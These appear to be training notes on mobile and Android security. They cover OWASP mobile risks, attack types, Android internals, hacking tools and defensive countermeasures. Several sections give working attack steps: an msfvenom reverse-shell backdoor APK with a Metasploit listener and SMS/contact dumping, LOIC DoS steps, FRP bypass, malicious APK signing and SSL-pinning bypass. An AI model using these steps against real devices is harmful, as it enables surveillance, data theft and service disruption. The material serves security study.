**Importance of Mobile Security**  
With the rise of mobile technology, smartphones and tablets are increasingly replacing desktops and laptops. These devices allow users to perform a wide range of tasks, including Internet browsing, GPS navigation, and mobile commerce (e.g., banking, purchasing goods, redeeming tickets). However, many users overlook the importance of security software, leaving them vulnerable to attacks.
**Learning Objectives**  
This module focuses on understanding and mitigating threats to mobile platforms. By the end of the module, you will learn:  
1. Mobile platform attack vectors.  
2. Hacking techniques for Android and iOS.  
3. Mobile Device Management (MDM) importance.  
4. Mobile security countermeasures and tools.  

**Mobile Threats and Attack Vectors**  
- **Attack Vectors:** Complex attacks exploit mobile data (financial, personal, corporate) and compromise mobile networks.  
- **Vulnerabilities:** OWASP's top 10 mobile risks, app store security issues, app sandboxing, mobile spam, and open Bluetooth/Wi-Fi connections.  
- **Data Transmission Risks:** Threats emerge from various connectivity channels like 3G/4G/5G, Bluetooth, Wi-Fi, and wired connections.  

**Vulnerable Areas in the Mobile Business Environment**  
- Mobile devices are used for both personal and business purposes, making them attractive targets for attackers.  
- Security threats include those unique to mobile devices and those common to desktops, laptops, and networks.  
![WhatsApp Image 2024-12-21 at 11 29 17_1556b4e8](https://github.com/user-attachments/assets/398b4f02-2f89-47bf-b93b-53c453111454)

### OWASP Top 10 Mobile Risks (2024)

#### M1 - Improper Credential Usage
This risk involves insecure handling of credentials, such as passwords and tokens, due to inadequate credential-management practices. Common issues include:
- Hardcoding credentials within the app.
- Storing credentials in unprotected locations.
- Transmitting credentials without encryption or via insecure channels.
- Weak authentication mechanisms.

Attackers exploit these vulnerabilities to gain unauthorized access to user accounts, sensitive data, and app functionalities, potentially causing data breaches and unauthorized transactions.

#### M2 - Inadequate Supply Chain Security
This risk arises from outdated or flawed third-party components and libraries integrated into mobile apps. Key factors include:
- Insecure coding practices.
- Insufficient code reviews and testing.
- Weak app signing and distribution processes.

Vulnerabilities in the supply chain can lead to exploits, such as code tampering, malicious code injection, or unauthorized access to backend servers, affecting user data and a developer's reputation.

#### M3 - Insecure Authentication/Authorization
This issue pertains to weaknesses in authentication and authorization mechanisms, including:
- Weak password policies.
- Improper token handling.
- Inadequate authorization checks.

Attackers use binary attacks, malware, or botnets to bypass these mechanisms, enabling impersonation or unauthorized access to sensitive data and app functionalities.

#### M4 - Insufficient Input/Output Validation
Improper validation or sanitization of inputs can lead to:
- SQL injection.
- Command injection.
- Cross-site scripting (XSS) attacks.

These vulnerabilities arise from errors in application logic, lack of security awareness, and inadequate testing, potentially compromising data integrity and application functionality.

#### M5 - Insecure Communication
This risk involves insecure or outdated communication protocols and improper SSL/TLS configurations, allowing attackers to intercept data. Common vulnerabilities include:
- Outdated encryption.
- Invalid SSL certificates.

Exploitation can lead to data interception, user impersonation, identity theft, and espionage.

#### M6 - Inadequate Privacy Controls
Poor protection of personally identifiable information (PII) due to weak access controls or noncompliance with privacy regulations. Attackers exploit this to commit identity theft, fraud, and data misuse, potentially resulting in user distrust and regulatory fines.

#### M7 - Insufficient Binary Protections
Lack of binary protections against reverse engineering and code tampering exposes apps to:
- Binary attacks.
- Counterfeit apps.
- Unauthorized access to premium app features.

Attackers exploit these vulnerabilities to compromise app functionality or distribute malicious apps.

#### M8 - Security Misconfiguration
This involves incorrect or incomplete security settings, such as:
- Weak encryption/hashing.
- Misconfigured access controls.
- Enabled debugging features.

Exploitation can result in data breaches, account hijacking, and backend system compromise.

#### M9 - Insecure Data Storage
Improperly secured sensitive data stored in plain text, unprotected databases, or with weak encryption methods. Attackers exploit these vulnerabilities through physical or remote device access, malware, or social engineering.

#### M10 - Insufficient Cryptography
Use of weak or outdated encryption algorithms, poor key management, or flawed cryptographic implementations. Attackers exploit these weaknesses to decrypt data, compromise security protocols, and access sensitive information.

---

### Anatomy of a Mobile Attack

**Device-Based Vulnerabilities:**
1. **Browser-Based Attacks:**
   - **Phishing:** Fake websites trick users into revealing sensitive data.
   - **Framing:** Malicious web pages embedded via iFrame to steal information.
   - **Clickjacking:** Misleading UI tricks users into revealing sensitive data or enabling malicious actions.
   - **Man-in-the-Mobile:** Malware bypasses OTP verification to access sensitive accounts.
   - **Buffer Overflow:** Overwrites memory, causing crashes or erratic behavior.
   - **Data Caching Exploits:** Attacks on cached sensitive data.

2. **Phone/SMS-Based Attacks:**
   - **Baseband Attacks:** Exploit GSM/3GPP vulnerabilities.
   - **SMiShing:** SMS phishing links trick users into revealing sensitive data.

3. **Application-Based Attacks:**
   - Weak data storage security and encryption.
   - Exploits in SSL validation, configuration manipulation, and privilege escalation.

4. **System-Based Attacks:**
   - **No Passcode/Weak Passcode:** Easy access to sensitive data.
   - **Jailbreaking (iOS) and Rooting (Android):** Circumvents security mechanisms.
   - **OS Data Caching Exploits:** Accessing sensitive data through cached OS information.
   - **Carrier-Loaded Software:** Exploitable pre-installed software.

5. **Network-Based Attacks:**
   - **Wi-Fi Vulnerabilities:** Weak/no encryption allows data interception.
   - **Rogue Access Points:** Illicit Wi-Fi access for eavesdropping.
   - **Man-in-the-Middle (MITM):** Interception and manipulation of data transmission.
   - **Session Hijacking:** Stealing valid session IDs for unauthorized access.
   - **DNS Poisoning and SSLStrip:** Redirect users to malicious sites or downgrade HTTPS to HTTP.

6. **Data Center/Cloud-Based Attacks:**
   - **Web Server Vulnerabilities:** Exploitable OS and application software flaws.
   - **Cross-Site Scripting (XSS):** Injecting malicious scripts into web pages.
   - **Cross-Site Request Forgery (CSRF):** Forcing unintended actions in active user sessions.
   - **Weak Input Validation:** Exploits through forged or malicious inputs.
### Database Attacks  
**Types of Database-Based Attacks:**  
- **SQL Injection:** Exploits vulnerabilities in input validation to execute unauthorized SQL commands, gaining access to sensitive data or the database itself.  
- **Privilege Escalation:** Leverages vulnerabilities to obtain elevated access and steal sensitive data.  
- **Data Dumping:** Forces the database to reveal large amounts of sensitive information.  
- **OS Command Execution:** Injects OS-level commands into a query, potentially allowing attackers to gain root-level system access.

---

### Profiting from Compromised Mobile Devices  
Smartphones contain sensitive personal, financial, and business information, making them attractive targets. Compromised devices can be exploited for:  
- **Surveillance:** Accessing audio, camera, call logs, SMS, and geolocation data.  
- **Financial Exploits:** Sending premium-rate SMS, stealing transaction authentication numbers (TANs), extortion via ransomware, or cryptocurrency mining.  
- **Data Theft:** Extracting account details, call logs, contacts, and sensitive data.  
- **Botnet Activity:** Launching DDoS attacks, click fraud, or sending premium-rate SMS.  
- **Impersonation:** Redirecting SMS, sending emails, posting on social media, or stealing passwords.

---

### Mobile Attack Vectors  
Mobile devices are vulnerable due to their widespread usage and unique features. Common attack vectors include:  
- **Malware:** Viruses, rootkits, and application modification.  
- **Data Exfiltration:** Extracting sensitive data through streams, screen scraping, or backups.  
- **Data Tampering:** Undetected modifications to data or applications.  
- **OS Modifications:** Exploiting rooted or jailbroken devices.

---

### Mobile Platform Vulnerabilities  
The advancement of mobile technology has introduced various risks, including:  
- **Malicious Apps in Stores:** Fake or repackaged apps containing malware.  
- **Mobile Malware:** Exploits device weaknesses to compromise data or control the device.  
- **App Sandboxing Issues:** Vulnerabilities in isolating apps from one another.  
- **Weak Encryption:** Insufficient encryption for data and apps.  
- **Update Issues:** Failure to apply timely OS and app updates.  
- **Excessive Permissions:** Apps requiring more permissions than necessary.  
- **Weak Communication Security:** Vulnerabilities in transport layer protocols.  
- **Physical Attacks:** Risks arising from unauthorized physical access.  
- **Insufficient Code Obfuscation:** Poorly protected code that’s easier to reverse-engineer.  

---

### Security Issues in App Stores  
Attackers exploit app distribution platforms to distribute malicious apps by:  
- **Repackaging Legitimate Apps:** Adding malware and uploading to third-party stores.  
- **Social Engineering:** Tricking users into downloading apps from unofficial sources.  
- **Poor Vetting Processes:** Allowing fake or malicious apps into marketplaces.  

**Consequences of Malicious Apps:**  
- **Data Theft:** Extracting sensitive user data such as call logs, photos, videos, and financial details.  
- **Device Exploitation:** Compromising user devices for further attacks or espionage.  
- **Further Attacks:** Using gathered data to perform phishing, identity theft, or fraud.  
### Mobile Spam  
Mobile spam (e.g., SMS, MMS, IM, and email spam) refers to unsolicited bulk messages targeting mobile devices. These messages often:  
- Advertise products/services.  
- Contain malicious links tricking users into revealing sensitive information.  
- Claim false prizes and redirect victims to premium-rate numbers.  
- Deploy phishing tactics to steal personal or financial information, leading to identity theft or fraud.

**Consequences of Mobile Spam:**  
- Financial losses.  
- Malware infections.  
- Corporate data breaches.

---

### SMS Phishing (SMiShing)  
SMiShing uses SMS to send deceptive messages containing malicious links or phone numbers to acquire personal or financial information. Attackers lure victims with messages about lotteries, account issues, or urgent notifications.

**Why SMiShing is Effective:**  
- High open rates for SMS compared to emails.  
- Users' trust in SMS as a direct and personal form of communication.  
- Limited awareness of SMiShing risks.  
- Shortened URLs that hide malicious links.  
- Lack of anti-phishing features in SMS platforms.  

---

### Bluetooth and Wi-Fi Pairing Attacks  
Open Bluetooth or automatic Wi-Fi settings expose devices to:  
- **Bluesnarfing:** Stealing information like contact lists, emails, and text messages via Bluetooth.  
- **Bluebugging:** Gaining unauthorized control over Bluetooth-enabled devices to access data, intercept messages, or make calls.  
- **MITM Attacks:** Intercepting unencrypted data on public networks.  

---

### Agent Smith Attack  
Attackers create malicious apps disguised as games or tools, often distributed via third-party app stores like 9Apps. Once installed, these apps replace legitimate ones with infected versions, such as WhatsApp or MX Player, to:  
- Display fraudulent ads for financial gain.  
- Steal personal information and credentials.  

---

### SS7 Vulnerability  
The Signaling System 7 (SS7) protocol, used for communication between mobile networks, lacks robust authentication. Attackers exploit this to:  
- Intercept SMS messages, OTPs, and calls.  
- Bypass two-factor authentication.  
- Perform MITM attacks, phone tapping, or DoS attacks against telecom operators.  
- Track device locations and reveal network identities.  

---

### Simjacker Attack  
Simjacker exploits the S@T browser on SIM cards, allowing attackers to send malicious SMS to:  
- Capture device location.  
- Monitor calls and gather IMEI and other data.  
- Force connections to malicious websites.  
- Perform DoS attacks on SIM cards.  

**Steps of Simjacker Attack:**  
1. Attacker sends a fraudulent SMS with hidden code.  
2. SIM’s S@T browser processes the malicious code.  
3. Device executes unauthorized commands.  
4. User information is exfiltrated via SMS for malicious use.  

---
---

### **Call Spoofing**
Call spoofing is a method used by attackers to manipulate caller ID to display a fake or trusted number. This deception enables attackers to:
- Trick individuals into sharing sensitive information.
- Commit fraud by impersonating trusted entities like banks or government agencies.
- Make threatening or harassing calls while concealing their identity.

**Tools Used:**
1. **SpoofCard**:
   - Allows use of virtual numbers for calls and texts.
   - Features include voice-changing, background noise addition, voicemail redirection, and call recording.
   - Integrates with cloud services like Google Drive and Dropbox.

2. Other Tools:
   - Fake Call (Play Store)
   - SpoofTel
   - Fake Call and SMS (Play Store)
   - Fake Caller ID
   - Phone Id - Fake Caller Buster (Play Store)

---

### **OTP Hijacking/Two-Factor Authentication Hijacking**
Attackers exploit vulnerabilities in OTP systems to redirect OTPs to their devices, enabling unauthorized access to victims' accounts. Methods include:
1. **SIM Jacking**:
   - Attackers convince telecom providers to transfer SIM ownership to themselves.
   - Can involve malware that intercepts OTPs on the target device.

2. **Lock Screen Notifications**:
   - Attackers physically access OTPs by observing lock screen notifications or tricking users into handing over devices.

**Tools Used:**
1. **AdvPhishing**:
   - A phishing tool that bypasses two-factor authentication.
   - Works on public networks using NGrok or localhost tunneling.

2. **mrphish**:
   - A bash script for phishing social media accounts and bypassing OTPs.
   - Compatible with rooted and non-rooted Android devices.

---

### **Camera/Microphone Capture Attacks**
Attackers exploit vulnerabilities in devices to gain unauthorized access to cameras and microphones for data theft or surveillance.

#### **Camfecting Attack (Webcam Hijacking)**
1. Attackers use phishing emails or malicious websites to install remote access Trojans (RATs) on victim devices.
2. RATs allow attackers to:
   - Disable camera lights to avoid detection.
   - Access and control the camera and microphone remotely.
   - Steal sensitive data like photos, videos, and location information.

#### **Android Camera Hijack Attack**
1. Attackers exploit vulnerabilities in the Android camera app to bypass permissions and gain access even on locked devices.
2. Exploited permissions include:
   - CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION.
3. Attackers trick victims into downloading malicious apps containing Trojans that establish persistent connections for surveillance.

**Tools Used:**
1. **StormBreaker**:
   - Captures device cameras/microphones via social engineering.
   - Can access location, webcam, and microphone without user consent.

2. Additional Tools:
   - CamPhish
   - HACK-CAMERA
   - E-TOOL
   - CamOver
   - CAM-DUMPER

---

### **Hacking Android OS Overview**

The growing usage of smartphones and tablets, particularly those running the Android OS, has attracted attackers aiming to exploit its vulnerabilities. Android, being an open-source platform, offers flexibility but also makes it a frequent target for hacking attempts. This document explores Android OS architecture, vulnerabilities, rooting processes, tools used for attacks, and methods to secure devices.

---

### **Android OS Overview**

Android, developed by Google, is a software environment for mobile devices encompassing the operating system, middleware, and key applications. It is based on the Linux kernel and provides extensive features and tools for developers. 

#### **Key Features of Android OS:**
- **UI Components:** Prebuilt structured layouts and UI controls for app GUIs.
- **Data Storage Options:**
  - **Shared Preferences:** Key-value pairs for private primitive data.
  - **Internal Storage:** Private device memory.
  - **External Storage:** Public shared external storage.
  - **SQLite Databases:** Structured data in a private database.
  - **Network Connection:** Remote data storage on custom servers.
- **Performance Tools:**
  - RenderScript for platform-independent computation.
  - APIs for communication (Bluetooth, NFC, Wi-Fi, USB, SIP).
- **Development Environment:** Emulator, debugging tools, memory profiling, and Eclipse IDE plugins.
- **Media and Connectivity:** Support for common formats (MP3, MPEG4, etc.) and rich APIs for hardware interactions.

---

### **Android OS Architecture**

Android OS consists of six sections (System Apps, Java API Framework, Native Libraries, Android Runtime, HAL, and Linux Kernel) and five layers.

#### **1. System Apps**
- The topmost layer containing pre-installed apps like dialers, email, browsers, and SMS.
- Most Android apps are developed using Java.

#### **2. Java API Framework**
- Provides high-level services and APIs written in Java to aid developers in app creation.
- **Components:**
  - **Content Providers:** Manage inter-application data sharing.
  - **View System:** Build GUI components like buttons and grids.
  - **Activity Manager:** Control application lifecycle.
  - **Location Manager:** GPS and cellular location services.
  - **Package Manager:** Tracks installed apps.
  - **Notification Manager:** Custom status bar messages.
  - **Resource Manager:** Handles app resources.
  - **Telephony Manager:** Manages voice calls.
  - **Window Manager:** Manages application windows.

#### **3. Native C/C++ Libraries**
- Libraries written in C/C++ for hardware-specific tasks:
  - **WebKit and Blink:** HTML rendering for web browsers.
  - **Open Max AL:** Multimedia handling.
  - **SQLite:** Structured data storage.
  - **Media Framework:** Media codecs for audio/video recording.
  - **OpenGL | ES:** Graphics rendering library.
  - **SSL:** Internet security.

#### **4. Android Runtime (ART)**
- Introduced post-Android 5.0, ART optimizes performance with:
  - Ahead-of-Time (AOT) and Just-in-Time (JIT) compilation.
  - Enhanced garbage collection (GC) and Dalvik Executable (DEX) format for compressed code.

#### **5. Hardware Abstraction Layer (HAL)**
- Acts as a mediator between hardware components and the software stack.
- HAL modules manage hardware like cameras, Bluetooth, sensors, and audio.

#### **6. Linux Kernel**
- The foundational layer, offering:
  - Device drivers for audio, Bluetooth, USB, Wi-Fi, etc.
  - Functions for memory, power, security, and network management.

---

### **Android Device Administration API**

Android's Device Administration API enables developers to build security-aware applications, ideal for enterprise environments requiring IT control over devices.

#### **Supported Policies:**
- **Password Management:**
  - Minimum length, alphanumeric, complexity, and expiration settings.
  - Enforces password history and lock after failed attempts.
- **Security Features:**
  - Remote wipe for lost/stolen devices.
  - Encryption of storage.
  - Camera disabling.
- **Inactivity and Locking:**
  - Device locks after inactivity.
  - Prompt for new password settings.

---

### **Android Vulnerabilities**

The flexibility of Android, combined with its widespread usage, makes it a common target for exploitation. Vulnerabilities include:
- **Unpatched OS and Apps:** Many users neglect timely updates, leaving devices susceptible to attacks.
- **Open-Source Nature:** While beneficial for developers, it provides attackers insights into potential flaws.
- **Complex Permissions:** Misuse of permissions (e.g., camera, microphone, and storage) by malicious apps.

---

### **Android Rooting Summary**

**Goal and Process:**
Rooting enables users to bypass restrictions imposed by manufacturers or carriers, allowing access to system-level settings and features. This involves:
1. Exploiting security vulnerabilities in firmware.
2. Installing the `su` binary to the system PATH (e.g., `/system/xbin/su`).
3. Granting executable permissions using `chmod`.

**Benefits of Rooting:**
- Modify/delete system files, modules, ROMs, and kernels.
- Remove pre-installed bloatware.
- Gain low-level hardware access.
- Enhanced performance and customization.
- Wi-Fi/Bluetooth tethering and SD card installations.
- Install root-only apps.

**Risks of Rooting:**
- Voids warranty.
- Increases susceptibility to malware.
- May degrade performance.
- Risks "bricking" (irreversible damage to the device).

**Tools:**
- KingoRoot (PC and APK versions).
- One Click Root.
- Other tools: TunesGo, RootMaster, Magisk Manager, KingRoot, iRoot.

---

### **Hacking Android Devices Summary**

Attackers target Android due to its popularity and open-source nature. They exploit vulnerabilities using tools and techniques such as:

**1. Attack Tools:**
- **drozer:** Identifies vulnerabilities, attack surfaces, and bypasses authentication without USB debugging.
- **zANTI, Network Spoofer, DroidSheep, LOIC:** Used for penetration testing and exploiting devices.
- **Orbot Proxy:** Ensures anonymity for hackers.

**Using drozer:**
- **Fetch Package Information:** Lists all installed packages and their details.
- **Identify Attack Surfaces:** Exports activities, services, and broadcast receivers.
- **Launch Activities:** Initiates specific activities to bypass authentication and exploit devices.

**2. Bypassing FRP (Factory Reset Protection):**
FRP is a security measure to prevent unauthorized access. Tools like **4ukey** and **Octoplus FRP** are used to bypass it, enabling access to:
- Personal data (contacts, messages, photos).
- Sensitive accounts or installation of malware.

**Steps to Bypass FRP with 4ukey:**
1. Launch 4ukey and connect the locked device.
2. Select the Android OS version and start the process.
3. Follow on-screen instructions to remove Google Lock.
4. Complete the process to regain access.

---
### **Hacking with zANTI and Kali NetHunter**

#### **zANTI for Network Attacks**  
zANTI is an Android-based penetration testing tool designed for network vulnerability analysis and exploitation. Attackers can use zANTI to:
- Spoof MAC addresses.
- Create malicious Wi-Fi hotspots to capture and control victim traffic.
- Perform port scans and router vulnerability exploitation.
- Conduct password complexity audits.
- Launch MITM (Man-In-The-Middle) and DoS attacks.
- View, modify, and redirect HTTP/HTTPS traffic.
- Inject HTML code into web pages or redirect HTTP requests to specific IPs or URLs.
- Hijack sessions and intercept downloads.
- Replace or modify images transmitted over the network.

---

#### **Kali NetHunter for Advanced Attacks**  
Kali NetHunter, a mobile penetration testing platform, provides tools for diverse cyberattacks. Attackers can:
- Conduct HID keyboard attacks, BadUSB attacks, and Evil AP MANA attacks.
- Generate custom payloads using Metasploit to exploit network vulnerabilities.
- Execute a range of sophisticated wireless and hardware-based attacks.

---

### **Launching DoS Attacks Using LOIC**  
Low Orbit Ion Cannon (LOIC) is a mobile tool for Denial of Service (DoS) and Distributed Denial of Service (DDoS) attacks.  
**Steps to Perform DoS Attack with LOIC:**
1. Install the LOIC app on an Android device.
2. Launch the app and enter the target IP address or URL.
3. Select the DoS attack method (UDP, HTTP, or TCP).
4. Specify the target port and the number of threads.
5. Start the attack by clicking the “START” button.

---

### **Orbot Proxy for Identity Protection**  
Orbot is a proxy application that routes Internet traffic through the Tor network, encrypting and anonymizing the data. Attackers use it to:
- Hide their identity while surfing or conducting cyberattacks.
- Bypass network restrictions or access blocked websites.

---

### **Exploiting Android Devices with PhoneSploit Pro**  
Android Debug Bridge (ADB) is a command-line tool used for communication with Android devices. When TCP debugging is enabled on port 5555, attackers can exploit it using **PhoneSploit Pro** to:
- Capture device screens.
- Access and dump system information.
- View and manipulate running applications.
- Forward ports and install/uninstall apps.
- Control hardware, such as enabling/disabling Wi-Fi.

**Requirements:**
- Target device must have ADB wireless debugging enabled.
- Attackers establish a connection via USB or TCP port 5555.

---

### **Man-in-the-Disk (MITD) Attack**  
An MITD attack exploits vulnerabilities in Android's external storage usage. It allows attackers to tamper with app updates or manipulate external storage data to install malicious apps.

**Steps Involved:**
1. **Legitimate App Installation:** Victim installs an app from a trusted source.
2. **Update Process:** Victim downloads an update, which temporarily stores code in external storage.
3. **Malicious Code Injection:** Attacker monitors external storage and replaces the update code with malicious content.
4. **Execution of Malicious Code:** The legitimate app unknowingly fetches and executes the malicious code, installing an attacker-controlled app.
5. **Attack Results:** The attacker gains access to sensitive data (e.g., login credentials, photos, hardware like cameras/microphones) or takes full control of the device.

---
### **Launching Spearphone Attack**

A spearphone attack exploits the accelerometer, a hardware-based motion sensor embedded in Android devices, to record loudspeaker data without requiring special permissions. Attackers can eavesdrop on loudspeaker voice conversations, including multimedia messages, voice assistant outputs, and audio files.

**Mechanism:**
- The accelerometer detects speech reverberations as the loudspeaker and sensor share the same device surface.
- Malicious apps can capture data and implement speech recognition to identify speakers, classify gender, and breach speech privacy.

---

### **Exploiting Android Devices Using Metasploit**

The Metasploit Framework allows attackers to exploit Android devices through custom or built-in payloads and exploits.

**Steps:**
1. **Identify Exploits and Payloads:**
   - `msf > search type:exploit platform:android`
   - `msf > search type:payload platform:android`

2. **Create a Custom Payload:**
   ```bash
   msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<Local Host IP> LPORT=<Port> R > Desktop/Backdoor.apk
   ```

3. **Set Up the Listener:**
   ```bash
   msf > use exploit/multi/handler
   msf > set PAYLOAD android/meterpreter/reverse_tcp
   msf > set LHOST <Local Host IP>
   msf > set LPORT <Port>
   msf > exploit
   ```

4. **Gather Data via Meterpreter Commands:**
   - View network configuration: `ipconfig`
   - List running processes: `ps`
   - Dump SMS, call logs, and contacts: `dump_sms`, `dump_calllog`, `dump_contacts`
   - Access camera: `webcam_list`

---

### **Analyzing Android Devices**

Analyzing Android devices involves examining their system, behavior, and vulnerabilities. The **ADB command-line tool** provides attackers with shell access to perform various malicious activities.

#### **Accessing Android Device through Shell**
1. Connect the device to a computer via USB and enable TCP/IP connections on port 5555:
   ```bash
   adb tcpip 5555
   ```
2. Disconnect the USB and connect over Wi-Fi:
   ```bash
   adb connect <device_ip_address>
   ```
3. Confirm connection:
   ```bash
   adb devices
   ```
4. Open a shell on the device:
   ```bash
   adb shell
   ```

#### **Enumeration and Disassembly**
- **List Installed Applications:**
  ```bash
  adb shell pm list packages
  adb shell pm list packages -3 -f
  frida-ps -Uai
  ```
- **Disassemble Targeted APKs:**
  ```bash
  apktool d <App_package>.apk
  tree
  ```

#### **Monitoring and Network Analysis**
- Store device logs:
  ```bash
  adb logcat > logcat.log
  ```
- List open files:
  ```bash
  lsof -p <pid>
  ```
- Analyze open connections:
  ```bash
  netstat -p | grep <pid>
  ```

#### **Signing and Installing Malicious APKs**
1. Create a custom code-signing certificate:
   ```bash
   keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000
   ```
2. Sign the APK:
   ```bash
   apksigner sign --ks ~/.android/debug.keystore --ks-key-alias signkey <malicious file>.apk
   ```

---

### **Man-in-the-Disk (MITD) Attack**

An MITD attack exploits the external storage vulnerabilities of Android apps. Legitimate app updates stored on external storage are intercepted and replaced with malicious code.

**Steps:**
1. Victim installs a legitimate app and receives an update stored on external storage.
2. The attacker monitors the storage and injects malicious code into the update.
3. The app fetches and executes the malicious code, installing a fraudulent app.
4. The malicious app gains access to sensitive data, hardware, and full control of the device.

**Consequences:**
- Theft of sensitive information (e.g., login credentials, photos).
- Hijacking of hardware (e.g., camera, microphone).
- Complete control over the victim's mobile device.

---

### **Advanced SMS Phishing (SMiShing)**

This phishing attack exploits flaws in Android smartphones (e.g., Samsung, Huawei, LG, Sony) by tricking users into accepting malicious settings via Over-the-Air (OTA) provisioning, a method used by network operators for device configuration updates. 

**Mechanism:**
1. **Attack Preparation:** 
   - The attacker obtains the victim's IMSI (International Mobile Subscriber Identity) to authenticate the malicious messages. 
   - If the IMSI is unavailable, the attacker sends two messages: one with a fake PIN and another with malicious settings authenticated by the PIN.
2. **Execution:** 
   - The victim accepts the fake PIN or settings, redirecting data traffic (e.g., message servers, mail servers, proxy addresses) to the attacker.

**Mitigation:**  
Applications like Harmony Mobile help detect and prevent SMiShing attacks.

---

### **Bypassing SSL Pinning**

SSL pinning ensures secure communication between an app and its server by validating trusted certificates and public keys. Attackers bypass SSL pinning through **reverse engineering** or **hooking**, often exploiting misconfigurations in SSL implementation.

#### **Reverse Engineering:**
- Tools: Apktool, keytool, Jarsigner.
- **Steps:**
  1. Decompile the app:
     ```bash
     apktool d <application_name.apk>
     ```
  2. Analyze and modify the smali code to alter SSL pinning logic.
  3. Recompile the app:
     ```bash
     apktool b <application_directory_name>
     ```

#### **Hooking:**
- Tool: Frida.
- **Steps:**
  1. Inject malicious JavaScript code at runtime:
     ```bash
     frida -U -l <Hooking_file.js> -f <package_name>
     ```
  2. Alter the application behavior during runtime to bypass SSL pinning.

---

### **Tap ’n Ghost Attack**

This attack exploits **NFC-enabled devices** and capacitive touchscreens using two techniques: **Tag-based Adaptive Ploy (TAP)** and **Ghost Touch Generator.**

#### **TAP:**
- Uses NFC tags to trigger actions (e.g., visiting malicious URLs) without the victim’s consent.
- Relies on web servers for device fingerprinting.

#### **Ghost Touch Generator:**
- Triggers actions such as “Cancel” buttons behaving as “Permit” buttons, tricking victims into granting remote access unknowingly.

**Applications:**
- Smartphone exploitation, voting machine tampering, ATM manipulation.

---

### **Android Malware**

#### **Mamont Banking Trojan:**
- **Disguised as Chrome Browser:** Delivered via phishing or spam messages.
- **Features:**
  - Requests permissions for SMS, phone calls, and personal data.
  - Tricks users into entering credit card details under the guise of a cash prize.
  - Prevents uninstallation for 24 hours to prolong its activity and data theft.

#### **Other Malware:**
1. **SecuriDropper**: Drops payloads onto devices for further exploitation.
2. **Dwphon**: Targets contact lists and SMS data.
3. **DogeRAT**: Facilitates remote access and spying.
4. **Tambir**: Steals sensitive information.
5. **SoumniBot**: Functions as a botnet for coordinated attacks.

---

### **Android Hacking Tools**

Attackers utilize a wide array of Android hacking tools to exploit vulnerabilities in target devices and extract sensitive user data like credentials, personal information, and contact lists.

---

#### **AndroRAT**
- **Source:** [GitHub](https://github.com)
- **Description:** A remote administration tool (RAT) for Android devices.
  - **Client/Server Architecture:**
    - Client side: Developed in Java for Android.
    - Server side: Built in Python.
  - **Features:**
    - Persistent backdoor that starts automatically on device boot.
    - Extracts current location, SIM card details, IP address, and MAC address.
    - Provides full remote control over the target device.

---

#### **Ghost Framework**
- **Source:** [GitHub](https://github.com)
- **Description:** A post-exploitation tool leveraging the Android Debug Bridge (ADB) for remote access.
  - **Capabilities:**
    - Access device shell without OpenSSH.
    - Port forwarding and extracting logs, MAC addresses, IP addresses, and more.
    - Device management, including:
      - Installing/uninstalling/running apps.
      - Extracting APKs and files.
      - Removing passwords.
      - Recording screens and taking screenshots.
      - Managing Wi-Fi and extracting WPA_supplicant.
      - Shutting down the device or emulating button presses.

---

#### **Additional Android Hacking Tools**
1. **hxp_photo_eye** ([GitHub](https://github.com))
2. **Gallery Eye** ([GitHub](https://github.com))
3. **mSpy** ([Official Site](https://www.mspy.com)): A commercial spyware application.
4. **Hackingtoolkit** ([GitHub](https://github.com))
5. **Social-Engineer Toolkit (SET)** ([GitHub](https://github.com)): Focused on social engineering attacks.

---

### **Android-Based Sniffers**

Network sniffers are tools used to intercept, monitor, and analyze network traffic on Android devices.

#### **PCAPdroid**
- **Source:** [Play Store](https://play.google.com)
- **Description:** Open-source tool that captures network traffic without requiring root access.
  - **Features:**
    - Simulates a VPN to monitor and analyze connections made by applications.
    - Processes all data locally without remote servers.

#### **Other Android-Based Sniffers**
1. **NetCapture** ([Play Store](https://play.google.com)): Captures packet data for analysis.
2. **Intercepter-NG** ([Official Site](http://sniff.su)): Focuses on sniffing and analyzing network data.
3. **Packet Capture** ([Play Store](https://play.google.com)): Intercepts SSL traffic for deeper analysis.
4. **Sniffer Wicap 2 Demo** ([9Apps](https://www.9apps.com)): Demonstrates packet capture capabilities.
5. **Reqable API Testing & Capture** ([Play Store](https://play.google.com)): Focuses on API traffic analysis and debugging.

---
### **Securing Android Devices**

Securing Android devices involves adopting best practices and leveraging tools to protect the device and the sensitive data stored within.

---

### **Recommended Countermeasures**
1. **Access Control:**
   - Enable screen lock using strong passwords, PINs, patterns, or biometric authentication (fingerprint or facial recognition).
   - Lock apps holding private data using tools like **AppLock**.

2. **App Management:**
   - Download apps only from official stores like Google Play.
   - Avoid direct APK downloads.
   - Check permissions, ratings, and reviews before installing apps.
   - Uninstall apps that invade privacy.

3. **System Security:**
   - Keep the OS and all apps updated.
   - Use Android antivirus software like **Kaspersky**, **Avira**, or **McAfee**.
   - Enable encryption to secure stored data.
   - Disable risky features such as SmartLock, visible passwords, and auto sign-in.

4. **Network and Connectivity:**
   - Turn off Bluetooth, NFC, and USB debugging when not in use.
   - Encrypt internet traffic using VPNs like **ExpressVPN** or **VyprVPN**.
   - Avoid connecting to untrusted Wi-Fi networks.

5. **Data Protection:**
   - Back up sensitive data to the cloud for recovery during security incidents.
   - Enable two-step verification (2FA) on accounts.
   - Restrict hardware connections to unsafe PCs or devices.

6. **Privacy and Tracking:**
   - Enable GPS and use tools like **Google Find My Device** for tracking and wiping lost devices.
   - Customize the lock screen with contact information in case of device recovery.

7. **Monitoring:**
   - Regularly review app activity and device logs for suspicious behavior.
   - Ensure **Google Play Protect** is active to detect malicious apps.

---

### **Android Security Tools**
1. **Kaspersky Antivirus for Android:**
   - Anti-virus, anti-theft, app lock, and anti-phishing features.
2. **Other Tools:**
   - **Avira Security Antivirus & VPN**
   - **Avast Antivirus & Security**
   - **McAfee Security**
   - **Lookout Mobile Security**
   - **Sophos Intercept X for Mobile**

---

### **Android Device Tracking Tools**

Tracking tools help locate lost or stolen devices, remotely lock them, or erase data.

#### **Google Find My Device**
- Tracks and secures lost devices:
  - Play sound for device location.
  - Lock device with a custom message.
  - Factory reset to wipe data.

**Requirements:**
- Device must be signed into a Google account and connected to mobile data/Wi-Fi with Location and Find My Device enabled.

#### **Find My Phone:**
- Anti-theft app for locating stolen or misplaced devices.

#### **Where’s My Droid:**
- Tracks devices using SMS attention words or an online control panel.

#### **Other Tracking Tools:**
- **Prey: Find My Phone & Security**
